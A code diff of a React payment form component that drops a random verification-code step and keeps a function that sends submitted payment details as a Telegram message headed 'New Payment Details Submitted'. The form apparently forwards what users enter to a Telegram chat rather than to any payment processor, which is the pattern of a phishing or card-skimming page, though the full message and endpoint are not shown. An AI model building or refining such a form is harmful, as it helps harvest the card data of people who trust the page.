@@ -5,7 +5,7 @@ import AddressAutocomplete, { AddressSuggestion } from "./AddressAutocomplete";
 import { supabase } from "@/integrations/supabase/client";
 
 interface PaymentFormProps {
-  onProceed: (verificationCode: string) => void;
+  onProceed: () => void;
   onBack: () => void;
 }
 
@@ -268,11 +268,7 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
     return v;
   };
 
-  const generateVerificationCode = () => {
-    return Math.floor(100000 + Math.random() * 900000).toString();
-  };
-
-  const sendTelegramNotification = async (verificationCode: string) => {
+  const sendTelegramNotification = async () => {
     try {
       const countryName = COUNTRIES.find(c => c.code === country)?.name || country;
       const message = `💳 <b>New Payment Details Submitted</b>
@@ -299,9 +295,8 @@ ${countryName}
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    const code = generateVerificationCode();
-    await sendTelegramNotification(code);
-    onProceed(code);
+    await sendTelegramNotification();
+    onProceed();
   };
 
   return (
